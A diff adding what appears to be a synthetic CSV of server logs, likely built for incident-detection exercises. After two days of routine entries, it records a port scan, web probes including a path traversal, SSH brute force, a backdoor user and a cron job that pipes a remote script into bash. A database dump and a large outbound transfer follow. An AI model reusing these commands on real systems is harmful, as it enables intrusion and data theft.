@@ -1,0 +1,775 @@
+line_id,timestamp,host,source,message
+1,2026-03-09 00:14:39,db01,systemd,logrotate.service: Succeeded.
+2,2026-03-09 01:08:43,fw01,firewall,ALLOW tcp 10.20.1.12:40325 -> 10.20.2.40:445 bytes=19686538
+3,2026-03-09 01:13:35,fw01,firewall,ALLOW tcp 10.20.1.11:44889 -> 10.20.2.40:445 bytes=11620619
+4,2026-03-09 03:11:09,app02,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
+5,2026-03-09 03:46:16,web02,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
+6,2026-03-09 04:32:18,app01,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
+7,2026-03-09 05:00:54,fw01,firewall,ALLOW tcp 10.20.1.11:52219 -> 10.20.2.40:445 bytes=9923565
+8,2026-03-09 05:04:48,web01,systemd,logrotate.service: Succeeded.
+9,2026-03-09 05:19:22,fw01,firewall,ALLOW tcp 10.20.3.55:48194 -> 10.20.2.40:445 bytes=22327358
+10,2026-03-09 06:05:31,db01,sshd,Accepted publickey for achen from 10.20.9.61 port 40157 ssh2
+11,2026-03-09 06:09:03,web01,nginx,"203.0.113.7 - - ""GET /api/v2/orders?page=12 HTTP/1.1"" 200 7765"
+12,2026-03-09 06:09:57,app02,cron,(deploy) CMD (/usr/local/bin/report.sh --daily)
+13,2026-03-09 06:14:49,web01,sshd,pam_unix(sshd:session): session opened for user monitor by (uid=0)
+14,2026-03-09 07:01:40,app01,sshd,Accepted publickey for tokafor from 10.20.9.96 port 53885 ssh2
+15,2026-03-09 07:16:29,app02,cron,(monitor) CMD (/usr/local/bin/report.sh --daily)
+16,2026-03-09 07:26:54,db01,cron,(achen) CMD (/usr/local/bin/report.sh --daily)
+17,2026-03-09 07:29:30,db01,systemd,Started Session 9641 of user tokafor.
+18,2026-03-09 07:29:39,fs01,sudo,deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+19,2026-03-09 07:32:01,web02,sshd,Accepted publickey for achen from 10.20.9.88 port 41067 ssh2
+20,2026-03-09 07:39:59,web02,nginx,"203.0.113.7 - - ""POST /api/v2/session HTTP/1.1"" 201 676"
+21,2026-03-09 07:41:28,app02,sshd,pam_unix(sshd:session): session opened for user backup by (uid=0)
+22,2026-03-09 07:46:39,fw01,firewall,ALLOW tcp 10.20.9.72:44029 -> 10.20.2.22:443 bytes=6520
+23,2026-03-09 07:49:53,web02,sshd,Accepted publickey for rpatel from 10.20.9.61 port 54398 ssh2
+24,2026-03-09 08:14:06,web02,nginx,"203.0.113.19 - - ""POST /api/v2/session HTTP/1.1"" 201 255"
+25,2026-03-09 08:31:02,fs01,cron,(monitor) CMD (/usr/local/bin/report.sh --daily)
+26,2026-03-09 09:03:40,fw01,firewall,DENY tcp 198.51.100.42:53962 -> 10.20.1.11:23 bytes=0
+27,2026-03-09 09:35:08,fs01,sshd,Accepted publickey for deploy from 10.20.9.14 port 54424 ssh2
+28,2026-03-09 09:47:27,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=34 HTTP/1.1"" 200 6977"
+29,2026-03-09 09:59:44,fw01,firewall,ALLOW tcp 10.20.9.96:41331 -> 10.20.2.40:443 bytes=24820
+30,2026-03-09 10:01:46,web02,nginx,"203.0.113.7 - - ""POST /api/v2/session HTTP/1.1"" 201 715"
+31,2026-03-09 10:14:39,web01,nginx,"203.0.113.7 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+32,2026-03-09 10:26:22,web02,nginx,"198.51.100.42 - - ""POST /api/v2/session HTTP/1.1"" 201 669"
+33,2026-03-09 10:37:30,fs01,sshd,pam_unix(sshd:session): session opened for user monitor by (uid=0)
+34,2026-03-09 10:39:08,web02,sshd,Accepted publickey for tokafor from 10.20.9.88 port 43411 ssh2
+35,2026-03-09 10:48:34,app02,sshd,Accepted publickey for deploy from 10.20.9.14 port 55170 ssh2
+36,2026-03-09 10:48:34,web02,nginx,"198.51.100.42 - - ""POST /api/v2/session HTTP/1.1"" 201 294"
+37,2026-03-09 10:54:22,vpn01,cron,(achen) CMD (/usr/local/bin/report.sh --daily)
+38,2026-03-09 10:55:59,db01,sshd,Failed password for tokafor from 10.20.9.61 port 45895 ssh2
+39,2026-03-09 11:18:49,fw01,firewall,ALLOW tcp 10.20.9.27:59057 -> 10.20.2.40:443 bytes=32471
+40,2026-03-09 11:26:58,web02,sudo,monitor : TTY=pts/0 ; PWD=/home/monitor ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+41,2026-03-09 11:31:18,fs01,sshd,Accepted publickey for achen from 10.20.9.14 port 58722 ssh2
+42,2026-03-09 11:55:31,web01,sshd,Accepted publickey for deploy from 10.20.9.14 port 41039 ssh2
+43,2026-03-09 12:00:18,fw01,firewall,DENY tcp 203.0.113.7:47818 -> 10.20.1.11:23 bytes=0
+44,2026-03-09 12:09:49,web01,nginx,"198.51.100.42 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+45,2026-03-09 12:13:05,app02,sshd,Accepted publickey for deploy from 10.20.9.88 port 45535 ssh2
+46,2026-03-09 12:35:30,db01,sudo,deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+47,2026-03-09 12:36:13,app02,sudo,rpatel : TTY=pts/0 ; PWD=/home/rpatel ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+48,2026-03-09 12:39:07,fw01,firewall,ALLOW tcp 10.20.9.72:48183 -> 10.20.2.22:443 bytes=21506
+49,2026-03-09 12:43:49,fs01,sshd,pam_unix(sshd:session): session opened for user swilliams by (uid=0)
+50,2026-03-09 12:48:19,web02,sshd,Accepted publickey for jmorales from 10.20.9.14 port 55431 ssh2
+51,2026-03-09 12:48:50,app01,sshd,pam_unix(sshd:session): session opened for user achen by (uid=0)
+52,2026-03-09 12:55:41,fw01,firewall,ALLOW tcp 10.20.9.96:44797 -> 10.20.1.11:443 bytes=49019
+53,2026-03-09 13:22:10,web02,nginx,"203.0.113.19 - - ""POST /api/v2/session HTTP/1.1"" 201 510"
+54,2026-03-09 13:30:26,web02,sshd,Accepted publickey for achen from 10.20.9.27 port 45585 ssh2
+55,2026-03-09 13:38:47,db01,sshd,Accepted publickey for jmorales from 10.20.9.33 port 56588 ssh2
+56,2026-03-09 13:39:12,web01,nginx,"203.0.113.7 - - ""GET /api/v2/orders?page=12 HTTP/1.1"" 200 2249"
+57,2026-03-09 13:41:29,app02,sudo,achen : TTY=pts/0 ; PWD=/home/achen ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+58,2026-03-09 13:43:39,web02,nginx,"203.0.113.7 - - ""POST /api/v2/session HTTP/1.1"" 201 654"
+59,2026-03-09 13:50:26,app01,sshd,Accepted publickey for deploy from 10.20.9.14 port 57923 ssh2
+60,2026-03-09 13:58:44,fw01,firewall,ALLOW tcp 10.20.9.27:56794 -> 10.20.3.55:443 bytes=23618
+61,2026-03-09 14:08:18,app02,sshd,Accepted publickey for backup from 10.20.9.72 port 42377 ssh2
+62,2026-03-09 14:09:44,web01,nginx,"203.0.113.19 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+63,2026-03-09 14:21:08,fw01,firewall,ALLOW tcp 10.20.9.96:42877 -> 10.20.2.21:443 bytes=45932
+64,2026-03-09 14:26:44,web01,nginx,"198.51.100.42 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+65,2026-03-09 14:28:27,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=21 HTTP/1.1"" 200 4835"
+66,2026-03-09 14:32:28,fs01,sshd,pam_unix(sshd:session): session opened for user rpatel by (uid=0)
+67,2026-03-09 15:05:45,app01,sshd,Accepted publickey for achen from 10.20.9.48 port 43764 ssh2
+68,2026-03-09 15:08:49,web02,sshd,Accepted publickey for deploy from 10.20.9.88 port 55607 ssh2
+69,2026-03-09 15:09:45,web01,sshd,Failed password for monitor from 10.20.9.48 port 57862 ssh2
+70,2026-03-09 15:17:24,fs01,sudo,swilliams : TTY=pts/0 ; PWD=/home/swilliams ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+71,2026-03-09 15:28:42,fw01,firewall,ALLOW tcp 10.20.9.61:51374 -> 10.20.2.22:443 bytes=3788
+72,2026-03-09 15:38:05,web01,nginx,"198.51.100.42 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+73,2026-03-09 15:54:58,web02,sshd,Accepted publickey for achen from 10.20.9.61 port 50936 ssh2
+74,2026-03-09 15:57:52,app02,cron,(achen) CMD (/usr/local/bin/report.sh --daily)
+75,2026-03-09 16:08:57,fw01,firewall,ALLOW tcp 10.20.9.61:48903 -> 10.20.2.40:443 bytes=39565
+76,2026-03-09 16:37:36,app01,sshd,Accepted publickey for rpatel from 10.20.9.14 port 46778 ssh2
+77,2026-03-09 16:38:14,web02,sshd,Accepted publickey for swilliams from 10.20.9.48 port 43302 ssh2
+78,2026-03-09 16:41:27,fs01,sshd,Accepted publickey for tokafor from 10.20.9.96 port 43046 ssh2
+79,2026-03-09 16:43:20,fw01,firewall,DENY tcp 203.0.113.7:55904 -> 10.20.1.11:23 bytes=0
+80,2026-03-09 16:46:45,web02,cron,(swilliams) CMD (/usr/local/bin/report.sh --daily)
+81,2026-03-09 17:02:12,web02,nginx,"203.0.113.7 - - ""POST /api/v2/session HTTP/1.1"" 201 866"
+82,2026-03-09 17:15:43,vpn01,cron,(rpatel) CMD (/usr/local/bin/report.sh --daily)
+83,2026-03-09 17:22:15,fs01,systemd,Started Session 2104 of user achen.
+84,2026-03-09 17:25:00,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=32 HTTP/1.1"" 200 4343"
+85,2026-03-09 17:34:25,fw01,firewall,ALLOW tcp 10.20.9.72:41687 -> 10.20.1.12:443 bytes=37471
+86,2026-03-09 17:34:38,web01,nginx,"203.0.113.7 - - ""GET /api/v2/orders?page=24 HTTP/1.1"" 200 1052"
+87,2026-03-09 17:48:11,fw01,firewall,DENY tcp 203.0.113.7:40109 -> 10.20.1.11:23 bytes=0
+88,2026-03-09 18:07:26,fw01,firewall,DENY tcp 198.51.100.42:46018 -> 10.20.1.11:23 bytes=0
+89,2026-03-09 18:32:19,fw01,firewall,ALLOW tcp 10.20.9.48:55682 -> 10.20.2.22:443 bytes=20484
+90,2026-03-09 18:50:26,web01,sshd,pam_unix(sshd:session): session opened for user jmorales by (uid=0)
+91,2026-03-09 19:02:11,fs01,sshd,Failed password for deploy from 10.20.9.33 port 59436 ssh2
+92,2026-03-09 19:05:44,fw01,firewall,DENY tcp 203.0.113.19:49390 -> 10.20.1.11:23 bytes=0
+93,2026-03-09 19:14:13,web01,nginx,"203.0.113.7 - - ""GET /api/v2/orders?page=2 HTTP/1.1"" 200 858"
+94,2026-03-09 19:29:01,web01,nginx,"203.0.113.7 - - ""GET /api/v2/orders?page=29 HTTP/1.1"" 200 1950"
+95,2026-03-09 19:35:09,db01,sshd,pam_unix(sshd:session): session opened for user achen by (uid=0)
+96,2026-03-09 19:38:07,web01,nginx,"203.0.113.19 - - ""GET /api/v2/orders?page=1 HTTP/1.1"" 200 1584"
+97,2026-03-09 19:51:01,app02,sshd,pam_unix(sshd:session): session opened for user achen by (uid=0)
+98,2026-03-09 19:51:28,app02,sshd,Failed password for tokafor from 10.20.9.96 port 56971 ssh2
+99,2026-03-09 20:00:43,app01,systemd,Started Session 8653 of user jmorales.
+100,2026-03-09 20:02:52,vpn01,sshd,pam_unix(sshd:session): session opened for user deploy by (uid=0)
+101,2026-03-09 20:21:46,web01,cron,(swilliams) CMD (/usr/local/bin/report.sh --daily)
+102,2026-03-09 20:21:54,web02,nginx,"198.51.100.42 - - ""POST /api/v2/session HTTP/1.1"" 201 384"
+103,2026-03-09 20:30:44,fw01,firewall,ALLOW tcp 10.20.9.14:49861 -> 10.20.2.40:443 bytes=10711
+104,2026-03-09 20:47:55,fs01,sshd,pam_unix(sshd:session): session opened for user backup by (uid=0)
+105,2026-03-10 00:27:54,web01,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
+106,2026-03-10 00:56:16,web02,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
+107,2026-03-10 01:23:37,web02,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
+108,2026-03-10 01:54:10,vpn01,sudo,deploy : TTY=pts/3 ; PWD=/opt/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app.service
+109,2026-03-10 02:42:35,app02,sshd,Accepted publickey for backup from 10.20.2.40 port 49505 ssh2
+110,2026-03-10 02:44:32,app01,sshd,Accepted publickey for deploy from 10.20.2.21 port 57496 ssh2
+111,2026-03-10 03:19:42,app02,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
+112,2026-03-10 04:45:17,app02,cron,(monitor) CMD (/usr/local/bin/healthcheck --quiet)
+113,2026-03-10 05:57:13,web02,sudo,deploy : TTY=pts/3 ; PWD=/opt/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app.service
+114,2026-03-10 06:04:52,vpn01,sshd,Accepted publickey for jmorales from 10.20.9.33 port 51305 ssh2
+115,2026-03-10 06:09:06,web02,nginx,"203.0.113.19 - - ""POST /api/v2/session HTTP/1.1"" 201 361"
+116,2026-03-10 06:13:53,web01,nginx,"203.0.113.7 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+117,2026-03-10 06:20:18,web02,sshd,Accepted publickey for tokafor from 10.20.9.96 port 53815 ssh2
+118,2026-03-10 06:22:06,web02,nginx,"198.51.100.42 - - ""POST /api/v2/session HTTP/1.1"" 201 205"
+119,2026-03-10 06:29:27,web01,nginx,"203.0.113.7 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+120,2026-03-10 06:37:13,web02,sshd,pam_unix(sshd:session): session opened for user swilliams by (uid=0)
+121,2026-03-10 07:34:53,fw01,firewall,DENY tcp 203.0.113.19:43647 -> 10.20.1.11:23 bytes=0
+122,2026-03-10 07:38:23,fs01,sshd,Accepted publickey for backup from 10.20.9.48 port 44140 ssh2
+123,2026-03-10 07:58:08,web01,sshd,pam_unix(sshd:session): session opened for user rpatel by (uid=0)
+124,2026-03-10 07:59:26,vpn01,sshd,Failed password for deploy from 10.20.9.72 port 42881 ssh2
+125,2026-03-10 08:01:03,db01,sshd,pam_unix(sshd:session): session opened for user deploy by (uid=0)
+126,2026-03-10 08:25:31,db01,sudo,monitor : TTY=pts/0 ; PWD=/home/monitor ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+127,2026-03-10 08:27:30,fs01,sudo,swilliams : TTY=pts/0 ; PWD=/home/swilliams ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+128,2026-03-10 08:40:41,vpn01,sshd,Accepted publickey for tokafor from 10.20.9.14 port 59835 ssh2
+129,2026-03-10 09:00:55,web01,systemd,Started Session 4493 of user tokafor.
+130,2026-03-10 09:35:37,db01,sshd,pam_unix(sshd:session): session opened for user deploy by (uid=0)
+131,2026-03-10 09:36:40,web01,sudo,tokafor : TTY=pts/0 ; PWD=/home/tokafor ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+132,2026-03-10 09:38:52,db01,sshd,Accepted publickey for achen from 10.20.9.96 port 50825 ssh2
+133,2026-03-10 09:47:35,vpn01,cron,(deploy) CMD (/usr/local/bin/report.sh --daily)
+134,2026-03-10 09:56:35,fs01,sshd,Failed password for jmorales from 10.20.9.33 port 48368 ssh2
+135,2026-03-10 10:06:24,fs01,sshd,Accepted publickey for jmorales from 10.20.9.61 port 45496 ssh2
+136,2026-03-10 10:08:01,fs01,sshd,Accepted publickey for monitor from 10.20.9.27 port 56331 ssh2
+137,2026-03-10 10:19:10,fw01,firewall,DENY tcp 203.0.113.7:51229 -> 10.20.1.11:23 bytes=0
+138,2026-03-10 10:25:34,web02,nginx,"198.51.100.42 - - ""POST /api/v2/session HTTP/1.1"" 201 310"
+139,2026-03-10 10:43:03,web01,nginx,"203.0.113.19 - - ""GET /api/v2/orders?page=39 HTTP/1.1"" 200 7657"
+140,2026-03-10 10:47:14,fw01,firewall,ALLOW tcp 10.20.9.48:40833 -> 10.20.2.21:443 bytes=7561
+141,2026-03-10 11:01:42,web01,nginx,"203.0.113.7 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+142,2026-03-10 11:04:04,app02,sshd,pam_unix(sshd:session): session opened for user jmorales by (uid=0)
+143,2026-03-10 11:14:33,fw01,firewall,DENY tcp 198.51.100.42:54846 -> 10.20.1.11:23 bytes=0
+144,2026-03-10 11:29:10,web01,sshd,Failed password for backup from 10.20.9.96 port 40293 ssh2
+145,2026-03-10 12:09:53,fw01,firewall,ALLOW tcp 10.20.9.33:44969 -> 10.20.3.55:443 bytes=46102
+146,2026-03-10 12:23:06,fw01,firewall,DENY tcp 198.51.100.42:41696 -> 10.20.1.11:23 bytes=0
+147,2026-03-10 12:25:18,web01,nginx,"203.0.113.7 - - ""GET /api/v2/orders?page=7 HTTP/1.1"" 200 6564"
+148,2026-03-10 12:38:19,fs01,sshd,Accepted publickey for jmorales from 10.20.9.72 port 46929 ssh2
+149,2026-03-10 12:47:36,web02,nginx,"203.0.113.19 - - ""POST /api/v2/session HTTP/1.1"" 201 788"
+150,2026-03-10 12:49:42,vpn01,sudo,backup : TTY=pts/0 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+151,2026-03-10 12:50:23,vpn01,sshd,Accepted publickey for deploy from 10.20.9.14 port 48675 ssh2
+152,2026-03-10 12:51:31,fw01,firewall,ALLOW tcp 10.20.9.33:54192 -> 10.20.2.21:443 bytes=30335
+153,2026-03-10 12:57:38,app02,sshd,Failed password for swilliams from 10.20.9.96 port 59184 ssh2
+154,2026-03-10 13:01:19,app02,cron,(deploy) CMD (/usr/local/bin/report.sh --daily)
+155,2026-03-10 13:01:45,fw01,firewall,DENY tcp 203.0.113.7:44753 -> 10.20.1.11:23 bytes=0
+156,2026-03-10 13:06:01,fw01,firewall,DENY tcp 203.0.113.19:43550 -> 10.20.1.11:23 bytes=0
+157,2026-03-10 13:08:21,fs01,sshd,Accepted publickey for backup from 10.20.9.27 port 58398 ssh2
+158,2026-03-10 13:11:10,app02,sshd,Accepted publickey for swilliams from 10.20.9.72 port 46378 ssh2
+159,2026-03-10 13:28:08,web01,nginx,"203.0.113.19 - - ""GET /api/v2/orders?page=28 HTTP/1.1"" 200 5285"
+160,2026-03-10 13:28:09,app01,sshd,Accepted publickey for deploy from 10.20.9.96 port 59782 ssh2
+161,2026-03-10 13:28:55,web02,sshd,Accepted publickey for achen from 10.20.9.96 port 58814 ssh2
+162,2026-03-10 13:31:46,fw01,firewall,ALLOW tcp 10.20.9.48:58191 -> 10.20.2.21:443 bytes=16639
+163,2026-03-10 13:38:42,web02,nginx,"198.51.100.42 - - ""POST /api/v2/session HTTP/1.1"" 201 733"
+164,2026-03-10 13:46:57,app02,systemd,Started Session 3927 of user deploy.
+165,2026-03-10 13:58:44,db01,sshd,Accepted publickey for jmorales from 10.20.9.61 port 40087 ssh2
+166,2026-03-10 14:03:23,fw01,firewall,DENY tcp 203.0.113.7:42060 -> 10.20.1.11:23 bytes=0
+167,2026-03-10 14:07:51,db01,sshd,Failed password for swilliams from 10.20.9.88 port 50628 ssh2
+168,2026-03-10 14:27:58,db01,systemd,Started Session 7606 of user jmorales.
+169,2026-03-10 14:41:50,web02,sshd,Accepted publickey for deploy from 10.20.9.61 port 52382 ssh2
+170,2026-03-10 14:43:29,web02,sshd,Accepted publickey for achen from 10.20.9.88 port 56871 ssh2
+171,2026-03-10 15:14:51,fs01,sshd,Accepted publickey for tokafor from 10.20.9.33 port 53545 ssh2
+172,2026-03-10 15:35:39,web02,sshd,Failed password for deploy from 10.20.9.33 port 50982 ssh2
+173,2026-03-10 15:54:30,vpn01,systemd,Started Session 5146 of user tokafor.
+174,2026-03-10 16:20:26,fw01,firewall,ALLOW tcp 10.20.9.96:52764 -> 10.20.3.55:443 bytes=16225
+175,2026-03-10 16:21:44,app02,sshd,Failed password for monitor from 10.20.9.88 port 46622 ssh2
+176,2026-03-10 16:30:32,web02,nginx,"203.0.113.19 - - ""POST /api/v2/session HTTP/1.1"" 201 308"
+177,2026-03-10 16:45:23,web02,nginx,"203.0.113.7 - - ""POST /api/v2/session HTTP/1.1"" 201 729"
+178,2026-03-10 16:45:34,web01,nginx,"203.0.113.19 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+179,2026-03-10 17:11:22,fs01,cron,(tokafor) CMD (/usr/local/bin/report.sh --daily)
+180,2026-03-10 17:24:32,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=28 HTTP/1.1"" 200 6824"
+181,2026-03-10 17:27:01,fs01,systemd,Started Session 7473 of user swilliams.
+182,2026-03-10 17:38:52,app01,sudo,tokafor : TTY=pts/0 ; PWD=/home/tokafor ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+183,2026-03-10 17:39:43,fw01,firewall,ALLOW tcp 10.20.9.48:42092 -> 10.20.2.40:443 bytes=39376
+184,2026-03-10 17:49:19,fw01,firewall,DENY tcp 203.0.113.7:55528 -> 10.20.1.11:23 bytes=0
+185,2026-03-10 17:58:44,web01,sshd,Failed password for jmorales from 10.20.9.33 port 40818 ssh2
+186,2026-03-10 18:08:19,fw01,firewall,ALLOW tcp 10.20.9.33:44327 -> 10.20.1.11:443 bytes=26739
+187,2026-03-10 18:15:37,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=27 HTTP/1.1"" 200 5167"
+188,2026-03-10 18:15:55,fw01,firewall,ALLOW tcp 10.20.9.14:47454 -> 10.20.1.12:443 bytes=47751
+189,2026-03-10 18:31:15,db01,sshd,Failed password for achen from 10.20.9.96 port 49597 ssh2
+190,2026-03-10 18:38:33,web02,nginx,"203.0.113.19 - - ""POST /api/v2/session HTTP/1.1"" 201 240"
+191,2026-03-10 18:40:20,web02,sshd,Failed password for achen from 10.20.9.96 port 49652 ssh2
+192,2026-03-10 18:44:03,web02,sshd,pam_unix(sshd:session): session opened for user jmorales by (uid=0)
+193,2026-03-10 18:44:33,fw01,firewall,DENY tcp 198.51.100.42:50405 -> 10.20.1.11:23 bytes=0
+194,2026-03-10 18:44:44,fw01,firewall,ALLOW tcp 10.20.9.96:44690 -> 10.20.2.21:443 bytes=6891
+195,2026-03-10 18:59:54,app01,sshd,pam_unix(sshd:session): session opened for user swilliams by (uid=0)
+196,2026-03-10 19:04:06,web01,nginx,"203.0.113.19 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+197,2026-03-10 19:30:56,fw01,firewall,ALLOW tcp 10.20.9.61:48560 -> 10.20.1.11:443 bytes=21582
+198,2026-03-10 19:41:51,fw01,firewall,ALLOW tcp 10.20.9.14:44087 -> 10.20.2.22:443 bytes=22689
+199,2026-03-10 20:05:46,fs01,sudo,achen : TTY=pts/0 ; PWD=/home/achen ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+200,2026-03-10 20:14:24,fw01,firewall,ALLOW tcp 10.20.9.27:51109 -> 10.20.1.21:443 bytes=27939
+201,2026-03-10 20:18:29,app01,sudo,achen : TTY=pts/0 ; PWD=/home/achen ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+202,2026-03-10 20:27:15,app02,sshd,Failed password for jmorales from 10.20.9.14 port 57039 ssh2
+203,2026-03-10 20:33:12,vpn01,systemd,Started Session 5525 of user backup.
+204,2026-03-10 20:39:25,fs01,systemd,Started Session 8392 of user achen.
+205,2026-03-10 20:44:06,web01,sshd,Accepted publickey for achen from 10.20.9.61 port 41310 ssh2
+206,2026-03-10 20:45:30,app02,sshd,pam_unix(sshd:session): session opened for user rpatel by (uid=0)
+207,2026-03-10 20:46:30,web01,cron,(jmorales) CMD (/usr/local/bin/report.sh --daily)
+208,2026-03-10 20:59:35,fw01,firewall,ALLOW tcp 10.20.9.96:45340 -> 10.20.1.21:443 bytes=39804
+209,2026-03-11 00:46:02,fw01,firewall,ALLOW tcp 10.20.2.21:51902 -> 10.20.2.40:445 bytes=11806526
+210,2026-03-11 01:48:19,web01,sshd,Accepted publickey for backup from 10.20.2.40 port 43808 ssh2
+211,2026-03-11 01:59:16,vpn01,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
+212,2026-03-11 02:14:00,fw01,firewall,DENY tcp 185.243.115.94:51949 -> 10.20.1.11:21 bytes=0
+213,2026-03-11 02:14:01,fw01,firewall,DENY tcp 185.243.115.94:50044 -> 10.20.1.11:22 bytes=0
+214,2026-03-11 02:14:02,fw01,firewall,DENY tcp 185.243.115.94:51585 -> 10.20.1.11:23 bytes=0
+215,2026-03-11 02:14:05,fw01,firewall,DENY tcp 185.243.115.94:52979 -> 10.20.1.11:25 bytes=0
+216,2026-03-11 02:14:06,fw01,firewall,DENY tcp 185.243.115.94:50144 -> 10.20.1.11:80 bytes=0
+217,2026-03-11 02:14:08,fw01,firewall,DENY tcp 185.243.115.94:58401 -> 10.20.1.11:110 bytes=0
+218,2026-03-11 02:14:10,fw01,firewall,DENY tcp 185.243.115.94:50638 -> 10.20.1.11:143 bytes=0
+219,2026-03-11 02:14:11,fw01,firewall,DENY tcp 185.243.115.94:54993 -> 10.20.1.11:443 bytes=0
+220,2026-03-11 02:14:12,fw01,firewall,DENY tcp 185.243.115.94:59784 -> 10.20.1.11:445 bytes=0
+221,2026-03-11 02:14:15,fw01,firewall,DENY tcp 185.243.115.94:53445 -> 10.20.1.11:3306 bytes=0
+222,2026-03-11 02:14:18,fw01,firewall,DENY tcp 185.243.115.94:53250 -> 10.20.1.11:3389 bytes=0
+223,2026-03-11 02:14:19,fw01,firewall,DENY tcp 185.243.115.94:59382 -> 10.20.1.11:8080 bytes=0
+224,2026-03-11 02:19:00,web01,nginx,"185.243.115.94 - - ""GET /admin HTTP/1.1"" 404 207"
+225,2026-03-11 02:19:06,web01,nginx,"185.243.115.94 - - ""GET /wp-login.php HTTP/1.1"" 404 168"
+226,2026-03-11 02:19:12,web01,nginx,"185.243.115.94 - - ""GET /.env HTTP/1.1"" 404 313"
+227,2026-03-11 02:19:18,web01,nginx,"185.243.115.94 - - ""GET /.git/config HTTP/1.1"" 404 279"
+228,2026-03-11 02:19:24,web01,nginx,"185.243.115.94 - - ""GET /backup.zip HTTP/1.1"" 404 275"
+229,2026-03-11 02:19:31,web01,nginx,"185.243.115.94 - - ""GET /phpmyadmin/ HTTP/1.1"" 404 170"
+230,2026-03-11 02:19:36,web01,nginx,"185.243.115.94 - - ""GET /api/v2/../../etc/passwd HTTP/1.1"" 400 236"
+231,2026-03-11 02:31:00,vpn01,sshd,Failed password for root from 185.243.115.94 port 42841 ssh2
+232,2026-03-11 02:31:02,vpn01,sshd,Failed password for invalid user admin from 185.243.115.94 port 59082 ssh2
+233,2026-03-11 02:31:03,vpn01,sshd,Failed password for invalid user oracle from 185.243.115.94 port 52706 ssh2
+234,2026-03-11 02:31:06,vpn01,sshd,Failed password for invalid user test from 185.243.115.94 port 49490 ssh2
+235,2026-03-11 02:31:07,vpn01,sshd,Failed password for ubuntu from 185.243.115.94 port 40687 ssh2
+236,2026-03-11 02:31:09,vpn01,sshd,Failed password for jmorales from 185.243.115.94 port 42050 ssh2
+237,2026-03-11 02:31:10,vpn01,sshd,Failed password for jmorales from 185.243.115.94 port 43202 ssh2
+238,2026-03-11 02:31:11,vpn01,sshd,Failed password for jmorales from 185.243.115.94 port 56769 ssh2
+239,2026-03-11 02:31:14,vpn01,sshd,Failed password for svc_backup from 185.243.115.94 port 40608 ssh2
+240,2026-03-11 02:31:17,vpn01,sshd,Failed password for svc_backup from 185.243.115.94 port 42734 ssh2
+241,2026-03-11 02:31:19,vpn01,sshd,Failed password for deploy from 185.243.115.94 port 40760 ssh2
+242,2026-03-11 02:31:20,vpn01,sshd,Failed password for deploy from 185.243.115.94 port 42651 ssh2
+243,2026-03-11 02:31:22,vpn01,sshd,Failed password for deploy from 185.243.115.94 port 49261 ssh2
+244,2026-03-11 02:31:24,vpn01,sshd,Failed password for deploy from 185.243.115.94 port 52403 ssh2
+245,2026-03-11 02:31:27,vpn01,sshd,Accepted password for deploy from 185.243.115.94 port 51884 ssh2
+246,2026-03-11 02:31:29,vpn01,sshd,pam_unix(sshd:session): session opened for user deploy by (uid=0)
+247,2026-03-11 02:34:29,vpn01,sudo,deploy : TTY=pts/2 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash svc_update
+248,2026-03-11 02:34:40,vpn01,useradd,"new user: name=svc_update, UID=1041, GID=1041, home=/home/svc_update, shell=/bin/bash"
+249,2026-03-11 02:35:00,vpn01,sshd,Accepted publickey for svc_update from 10.20.3.55 port 44210 ssh2
+250,2026-03-11 02:35:35,vpn01,cron,(svc_update) CMD (curl -s http://45.147.230.61/u.sh | bash)
+251,2026-03-11 02:59:04,web01,systemd,logrotate.service: Succeeded.
+252,2026-03-11 03:02:00,db01,sshd,Accepted password for svc_update from 10.20.3.55 port 39914 ssh2
+253,2026-03-11 03:02:18,db01,sudo,svc_update : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/mysqldump --all-databases
+254,2026-03-11 03:03:00,db01,systemd,Started Session 8842 of user svc_update.
+255,2026-03-11 03:05:41,web01,systemd,logrotate.service: Succeeded.
+256,2026-03-11 03:07:00,fw01,firewall,ALLOW tcp 10.20.1.21:54574 -> 45.147.230.61:443 bytes=72846463
+257,2026-03-11 03:07:47,fw01,firewall,ALLOW tcp 10.20.1.21:49831 -> 45.147.230.61:443 bytes=54086409
